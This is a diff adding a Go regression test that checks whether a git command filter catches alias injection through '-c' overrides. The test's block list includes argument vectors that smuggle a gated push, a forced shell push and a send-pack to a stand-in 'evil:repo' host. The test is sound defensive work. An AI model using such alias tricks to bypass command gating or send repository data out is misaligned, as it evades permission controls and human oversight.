@@ -215,6 +215,36 @@ func TestRemoteRewriteViaEnv(t *testing.T) {
 	}
 }
 
+// TestAliasInjection is the SEC-6/H-30 regression: a command-line alias that
+// runs a gated verb or a shell command must be detected, while benign aliases
+// and unrelated -c overrides are left alone.
+func TestAliasInjection(t *testing.T) {
+	t.Parallel()
+
+	block := [][]string{
+		{"-c", "alias.p=push", "p", "origin"},         // alias -> gated verb
+		{"-c", "alias.x=!git push --force", "x"},      // shell alias
+		{"-c", "alias.s=send-pack", "s", "evil:repo"}, // alias -> plumbing exfil verb
+	}
+	for _, a := range block {
+		if _, ok := aliasInjection(a); !ok {
+			t.Errorf("should block alias injection: %v", a)
+		}
+	}
+
+	allow := [][]string{
+		{"-c", "alias.co=checkout", "co"},   // benign alias, non-gated verb
+		{"push", "origin"},                  // no alias at all
+		{"-c", "core.pager=less", "status"}, // unrelated -c override
+		{"-c", "alias.p=push", "status"},    // alias defined but NOT the invoked subcommand
+	}
+	for _, a := range allow {
+		if key, ok := aliasInjection(a); ok {
+			t.Errorf("should NOT block %v (flagged %q)", a, key)
+		}
+	}
+}
+
 func TestIsExecFailure(t *testing.T) {
 	if isExecFailure(nil) {
 		t.Error("nil is not a failure")
